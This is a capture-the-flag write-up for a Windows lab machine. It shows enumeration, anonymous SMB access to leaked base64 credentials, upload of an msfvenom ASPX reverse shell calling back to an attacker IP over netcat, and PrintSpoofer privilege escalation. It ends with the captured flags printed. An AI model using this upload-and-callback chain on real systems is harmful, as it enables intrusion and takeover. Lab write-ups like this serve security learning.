# IP
10.10.77.98

## Enumeration

### Nmap
Found 5 port running on the system
```console
❯ cat nmap.log
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-30 11:15 IST
Nmap scan report for 10.10.77.98
Host is up (0.18s latency).
Not shown: 995 filtered tcp ports (no-response)
PORT     STATE SERVICE        VERSION
80/tcp   open  http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: IIS Windows Server
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp  open  msrpc          Microsoft Windows RPC
139/tcp  open  netbios-ssn    Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds   Windows Server 2016 Standard Evaluation 14393 microsoft-ds
3389/tcp open  ms-wbt-server?
| rdp-ntlm-info:
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2022-10-30T05:47:16+00:00
| ssl-cert: Subject: commonName=Relevant
| Not valid before: 2022-10-29T05:44:06
|_Not valid after:  2023-04-30T05:44:06
|_ssl-date: 2022-10-30T05:47:54+00:00; 0s from scanner time.
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h24m01s, deviation: 3h07m51s, median: 0s
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time:
|   date: 2022-10-30T05:47:16
|_  start_date: 2022-10-30T05:44:59
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| smb-os-discovery:
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-10-29T22:47:18-07:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 165.41 seconds
```
### Samba (139)
- Started `enum4linux`
```console
❯ enum4linux -a -u "guest" -p "" 10.10.77.98  | tee enum4linux.log
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Oct 30 11:16:40 2022

 =========================================( Target Information )=========================================
Target ........... 10.10.77.98
RID Range ........ 500-550,1000-1050
Username ......... 'guest'
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

 ============================( Enumerating Workgroup/Domain on 10.10.77.98 )============================
[E] Can't find workgroup/domain

 ================================( Nbtstat Information for 10.10.77.98 )================================
Looking up status of 10.10.77.98
No reply from 10.10.77.98

 ===================================( Session Check on 10.10.77.98 )===================================
[+] Server 10.10.77.98 allows sessions using username 'guest', password ''
 ================================( Getting domain SID for 10.10.77.98 )================================
Domain Name: WORKGROUP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 ===================================( OS information on 10.10.77.98 )===================================
[E] Can't get OS info with smbclient
[+] Got OS info for 10.10.77.98 from srvinfo:
	10.10.77.98   Wk Sv NT SNT
	platform_id     :	500
	os version      :	10.0
	server type     :	0x9003

 =======================================( Users on 10.10.77.98 )=======================================
 =================================( Share Enumeration on 10.10.77.98 )=================================
do_connect: Connection to 10.10.77.98 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	nt4wrksv        Disk
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available
[+] Attempting to map shares on 10.10.77.98
//10.10.77.98/ADMIN$	Mapping: DENIED Listing: N/A Writing: N/A
//10.10.77.98/C$	Mapping: DENIED Listing: N/A Writing: N/A
[E] Can't understand response:
NT_STATUS_NO_SUCH_FILE listing \*
//10.10.77.98/IPC$	Mapping: N/A Listing: N/A Writing: N/A
//10.10.77.98/nt4wrksv	Mapping: OK Listing: OK Writing: N/A
 ============================( Password Policy Information for 10.10.77.98 )============================
[E] Unexpected error from polenum:
[+] Attaching to 10.10.77.98 using guest
[+] Trying protocol 139/SMB...
	[!] Protocol failed: Cannot request session (Called Name:10.10.77.98)
[+] Trying protocol 445/SMB...
  [!] Protocol failed: rpc_s_access_denied
[E] Failed to get password policy with rpcclient
 =======================================( Groups on 10.10.77.98 )=======================================
```
- As we can see that we can connect to samba without password
- On connecting found a `passwords.txt` file
```console
❯ smbclient  -N \\\\10.10.77.98\\nt4wrksv  | tee smbclient.log
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun Jul 26 03:16:04 2020
  ..                                  D        0  Sun Jul 26 03:16:04 2020
  passwords.txt                       A       98  Sat Jul 25 20:45:33 2020

		7735807 blocks of size 4096. 4950954 blocks available
smb: \> get passwords.txt
smb: \> exit
```
- The `passwords.txt` contains user credentials. 
```console
❯ cat passwords.txt
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
```
- On decoding from `base64` found credentials for Bill and Bob
- Tried connecting with `xfreedp` but didn't find any valid user. 
- Started gobuster for port `80`.

### Gobuster 
Nothing interesting was found in the gobuster

- Started one more nmap scan, but for this tome for all the ports and found a new port 49669

### Nmap(all ports)
- This time found a new port `49669`, which is used for hosting databases
```console
❯ nmap -sC -sV 10.10.77.98 -p- -vvv  --min-rate=700 | tee nmap1.log
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-30 12:11 IST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:11
Completed NSE at 12:11, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:11
Completed NSE at 12:11, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:11
Completed NSE at 12:11, 0.00s elapsed
Initiating Ping Scan at 12:11
Scanning 10.10.77.98 [2 ports]
Completed Ping Scan at 12:11, 0.22s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:11
Completed Parallel DNS resolution of 1 host. at 12:11, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 12:11
Scanning 10.10.77.98 [65535 ports]
Discovered open port 139/tcp on 10.10.77.98
Discovered open port 3389/tcp on 10.10.77.98
Discovered open port 445/tcp on 10.10.77.98
Discovered open port 135/tcp on 10.10.77.98
Discovered open port 80/tcp on 10.10.77.98
Increasing send delay for 10.10.77.98 from 0 to 5 due to 11 out of 27 dropped probes since last increase.
Connect Scan Timing: About 16.11% done; ETC: 12:14 (0:02:41 remaining)
Stats: 0:00:31 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 16.19% done; ETC: 12:14 (0:02:40 remaining)
Increasing send delay for 10.10.77.98 from 5 to 10 due to 11 out of 11 dropped probes since last increase.
Increasing send delay for 10.10.77.98 from 10 to 20 due to 11 out of 11 dropped probes since last increase.
Connect Scan Timing: About 32.12% done; ETC: 12:14 (0:02:09 remaining)
Increasing send delay for 10.10.77.98 from 20 to 40 due to 11 out of 11 dropped probes since last increase.
Discovered open port 49669/tcp on 10.10.77.98
Increasing send delay for 10.10.77.98 from 40 to 80 due to 11 out of 15 dropped probes since last increase.
Stats: 0:01:30 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 47.94% done; ETC: 12:14 (0:01:38 remaining)
Increasing send delay for 10.10.77.98 from 80 to 160 due to 11 out of 18 dropped probes since last increase.
Connect Scan Timing: About 63.61% done; ETC: 12:14 (0:01:09 remaining)
Increasing send delay for 10.10.77.98 from 160 to 320 due to 11 out of 23 dropped probes since last increase.
Connect Scan Timing: About 79.62% done; ETC: 12:14 (0:00:38 remaining)
Increasing send delay for 10.10.77.98 from 320 to 640 due to 11 out of 11 dropped probes since last increase.
Increasing send delay for 10.10.77.98 from 640 to 1000 due to 11 out of 11 dropped probes since last increase.
Completed Connect Scan at 12:14, 187.68s elapsed (65535 total ports)
Initiating Service scan at 12:14
Scanning 6 services on 10.10.77.98
Completed Service scan at 12:15, 60.06s elapsed (6 services on 1 host)
NSE: Script scanning 10.10.77.98.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:15
NSE Timing: About 99.88% done; ETC: 12:16 (0:00:00 remaining)
Completed NSE at 12:16, 40.09s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:16
Completed NSE at 12:16, 1.10s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:16
Completed NSE at 12:16, 0.01s elapsed
Nmap scan report for 10.10.77.98
Host is up, received syn-ack (0.18s latency).
Scanned at 2022-10-30 12:11:33 IST for 289s
Not shown: 65529 filtered tcp ports (no-response)
PORT      STATE SERVICE       REASON  VERSION
80/tcp    open  http          syn-ack Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  syn-ack Windows Server 2016 Standard Evaluation 14393 microsoft-ds
3389/tcp  open  ms-wbt-server syn-ack Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2022-10-30T06:45:43+00:00
| ssl-cert: Subject: commonName=Relevant
| Issuer: commonName=Relevant
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-10-29T05:44:06
| Not valid after:  2023-04-30T05:44:06
| MD5:   f0d6 d486 3c8e 0450 8983 dc85 d86f 6b03
| SHA-1: b24f 3e70 f519 ba45 8916 0687 39ac dcd5 7761 96fe
| -----BEGIN CERTIFICATE-----
| MIIC1DCCAbygAwIBAgIQNLg57bu6hrhBF4V92gxsQTANBgkqhkiG9w0BAQsFADAT
| MREwDwYDVQQDEwhSZWxldmFudDAeFw0yMjEwMjkwNTQ0MDZaFw0yMzA0MzAwNTQ0
| MDZaMBMxETAPBgNVBAMTCFJlbGV2YW50MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
| MIIBCgKCAQEAnk+MbcCFXzIHEoLV+sJfN/wPbhfEBFcwcicaOokytLyC/J9RTK2L
| BqIpgDdJw7pyYXbINJP7ktNtzdn96rJfKirbkR9PIUPGug8fAfgHj7AaowBPfF9o
| vf5K0SDOdv3K8vy9Evuc+7JOEVE+nBTg0rGvX5Ap3S6TWv/gGoPfLRiOvjq3mKjd
| w2URQjVTg1SItV3rn+8T1NtQ49qjEKjvmaC5xT5gO1NXK/JSZC3LrOH99p/Q/BOY
| y33AnhBV6xrSI5+NVJIH/gyBmxroLizaSPRFFQincoKOny/n4ReQYKuAmLV8ucH/
| zy5Cwm/D1+DI+L4Aj1aJYx5IH+ajpSPi4QIDAQABoyQwIjATBgNVHSUEDDAKBggr
| BgEFBQcDATALBgNVHQ8EBAMCBDAwDQYJKoZIhvcNAQELBQADggEBACRLXSPX1/bO
| asH9WcEPWQ3KG0zxpUqOyi23vepfn3oLVWgb1LjQ3z/7Rh2/dasJNkh5g+n/hoMH
| a71hof2dNsEB4TnummggIbGBBXmc+ddpR6U/yxG01bK4h/vE0ZSjZ6SwXD84CRAD
| tNTujov0YO3IZHM3Kwc9a/lpI2bQRqnV7LZn5ZG4+MU2vWVpdPIkJpsC3CdWOcEb
| raYbhCQNVEB0bAognAQ8ZNmIMoY3bIa2IJnRKOV/eSZZJ6ITiTm0S0/tYBOJ+7O6
| rVH0RpHy7bU5go1jf6bqBOMAClwHmuoASzJcyEwwLPjm0x6BVlVM/BRa8Av8kMJ6
| /zTboV9KGKU=
|_-----END CERTIFICATE-----
|_ssl-date: 2022-10-30T06:46:22+00:00; 0s from scanner time.
49669/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
Host script results:
|_clock-skew: mean: 1h24m00s, deviation: 3h07m51s, median: 0s
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2022-10-30T06:45:46
|_  start_date: 2022-10-30T05:44:59
| smb-os-discovery:
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-10-29T23:45:45-07:00
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 63336/tcp): CLEAN (Timeout)
|   Check 2 (port 10691/tcp): CLEAN (Timeout)
|   Check 3 (port 61092/udp): CLEAN (Timeout)
|   Check 4 (port 42741/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:16
Completed NSE at 12:16, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:16
Completed NSE at 12:16, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:16
Completed NSE at 12:16, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 289.82 seconds
```

- So started gobuster on 49669, because nmap scan shows that it is serving as server.

### Gobuster (`49669`)
- Found directory `nt4wrksv` on the port.
- Tried to `passwords.txt` and voila, it was the same file as samba


## Exploitation
### Samba 
- Created a test file with random data and tried uploading it to samba.
```console
❯ echo "this is a test file" > test.txt
❯ smbclient  -N \\\\10.10.77.98\\nt4wrksv
Try "help" to get a list of possible commands.
smb: \> put test.txt
putting file test.txt as \test.txt (0.0 kb/s) (average 0.0 kb/s)
smb: \> dir
  .                                   D        0  Sun Oct 30 12:35:48 2022
  ..                                  D        0  Sun Oct 30 12:35:48 2022
  passwords.txt                       A       98  Sat Jul 25 20:45:33 2020
  test.txt                            A       20  Sun Oct 30 12:35:49 2022

		7735807 blocks of size 4096. 4949358 blocks available
smb: \> exit
```
- On requesting to the port 49663 found the test file with same content.
```console
❯ curl http://10.10.77.98:49663/nt4wrksv/test.txt
this is a test file
```
- Created  a reverse shell.
```console
❯ msfvenom -p windows/shell_reverse_tcp LHOST=10.17.0.215 LPORT=4242 -f aspx  > shell.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of aspx file: 2729 bytes
```
- Uploaded shell.
```console
❯ smbclient  -N \\\\10.10.77.98\\nt4wrksv
Try "help" to get a list of possible commands.
smb: \> put shell.aspx
putting file shell.aspx as \shell.aspx (1.4 kb/s) (average 1.4 kb/s)
smb: \> dir
  .                                   D        0  Sun Oct 30 12:42:10 2022
  ..                                  D        0  Sun Oct 30 12:42:10 2022
  passwords.txt                       A       98  Sat Jul 25 20:45:33 2020
  shell.aspx                          A     2729  Sun Oct 30 12:42:11 2022
  test.txt                            A       20  Sun Oct 30 12:35:49 2022

		7735807 blocks of size 4096. 4945857 blocks available
smb: \> exit
```

- Made a request and got a reverse shell.

```console
❯ rlwrap nc -lvnp 4242
listening on [any] 4242 ...
connect to [10.17.0.215] from (UNKNOWN) [10.10.77.98] 49812
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.
whoami
whoami
iis apppool\defaultapppool
c:\windows\system32\inetsrv>
```

### Privilege Escalation 
On looking for privilege information that the system is vulnerable to [Printspoofer](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
```console
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled   «-----------Impersonating can help 
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

```
- Downloaded `printspoofer.exe` from [here](https://github.com/dievus/printspoofer/blob/master/PrintSpoofer.exe).( **Don't use wget to download the binary** ) 

- Uploaded file to samba 
```console
smb: \> put PrintSpoofer.exe
putting file PrintSpoofer.exe as \PrintSpoofer.exe (112.1 kb/s) (average 53.3 kb/s)
smb: \> dir
  .                                   D        0  Sun Oct 30 13:04:24 2022
  ..                                  D        0  Sun Oct 30 13:04:24 2022
  passwords.txt                       A       98  Sat Jul 25 20:45:33 2020
  PrintSpoofer.exe                    A   136968  Sun Oct 30 13:04:25 2022
  shell.aspx                          A     2729  Sun Oct 30 12:42:11 2022
  shell1.aspx                         A     3415  Sun Oct 30 12:49:27 2022
  test.txt                            A       20  Sun Oct 30 12:35:49 2022

		7735807 blocks of size 4096. 4945616 blocks available
```
- Went to `c:\inetpub\wwwroot\nt4wrksv` and Started `PrintSpoofer.exe` with cmd
```console
PrintSpoofer.exe -i -c cmd
PrintSpoofer.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.
C:\Windows\system32>
```
- Found user.txt
```console
 Volume in drive C has no label.
 Volume Serial Number is AC3C-5CB5

 Directory of C:\Users\Bob\Desktop
07/25/2020  02:04 PM    <DIR>          .
07/25/2020  02:04 PM    <DIR>          ..
07/25/2020  08:24 AM                35 user.txt
               1 File(s)             35 bytes
               2 Dir(s)  20,222,042,112 bytes free
type user.txt
type user.txt
THM{fdk4ka34vk346ksxfr21tg789ktf45}
```
- Found `root.txt`
```console
dir
 Volume in drive C has no label.
 Volume Serial Number is AC3C-5CB5

 Directory of C:\Users\Administrator\Desktop
07/25/2020  08:24 AM    <DIR>          .
07/25/2020  08:24 AM    <DIR>          ..
07/25/2020  08:25 AM                35 root.txt
               1 File(s)             35 bytes
               2 Dir(s)  21,011,124,224 bytes free
type root.txt
type root.txt
THM{1fk5kf469devly1gl320zafgl345pv}
```
